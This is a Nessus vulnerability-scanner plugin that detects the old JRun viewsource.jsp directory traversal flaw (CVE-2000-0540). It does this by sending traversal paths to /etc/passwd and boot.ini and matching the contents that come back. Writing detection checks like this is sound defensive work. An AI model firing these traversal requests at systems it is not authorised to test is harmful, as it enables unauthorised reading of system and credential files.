#
# (C) Tenable Network Security, Inc.
#

#
# Updated by HDM <hdm@digitaloffense.net> to work for Unix servers
# (also, it seems that JRun runs as r00t on Solaris by default!)
#

#
# Thanks to Scott Clark <quualudes@yahoo.com> for testing this
# plugin and helping me to write a Nessus script in time for
# this problem
#

include("compat.inc");

if (description)
{
 script_id(10444); 
 script_version("$Revision: 1.36 $");
 script_cvs_date("$Date: 2015/09/24 21:17:11 $");

 script_cve_id("CVE-2000-0540");
 script_bugtraq_id(1386);
 script_osvdb_id(2713, 51283);

 script_name(english:"JRun viewsource.jsp Directory Traversal Arbitrary File Access");
 script_summary(english:"Determines the presence of the jrun flaw");
 
 script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host has a directory traversal
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The version of JRun on the remote host has a directory traversal
vulnerability in the 'source' parameter of viewsource.jsp.  A remote
attacker could exploit this to read arbitrary files.  This could be
used to read sensitive information, or information that could be used
to mount further attacks.");
 # http://web.archive.org/web/20100604075450/http://www.adobe.com/devnet/security/security_zone/asb00-15.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?86b91f1f");
 script_set_attribute(attribute:"solution", value:"Upgrade to JRun 2.3.3 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/06/22");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/06/22");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2015 Tenable Network Security, Inc.");
 
 script_dependencies("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 8000);

 exit(0);
}

#
# The script code starts here
#


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


file[0] = "/../../../../../../../../../boot.ini";    res[0] = "boot loader";
file[1] = "/../../../../../../../../../etc/passwd";  res[1] = "root:";

port = get_http_port(default:8000);
banner = get_http_banner(port:port);
if ( "jrun" >!< tolower(banner) ) exit(0);

function check_page(file, pat)
{
  local_var url, r, str;

  url = string("/jsp/jspsamp/jspexamples/viewsource.jsp?source=", file);
  r = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: 1);

  if (pat >< r[2])
  {
    security_warning(port:port);
    exit(0);
  }
}


for(i=0;file[i];i=i+1)
{
    check_page(file:file[i], pat:res[i]);
}
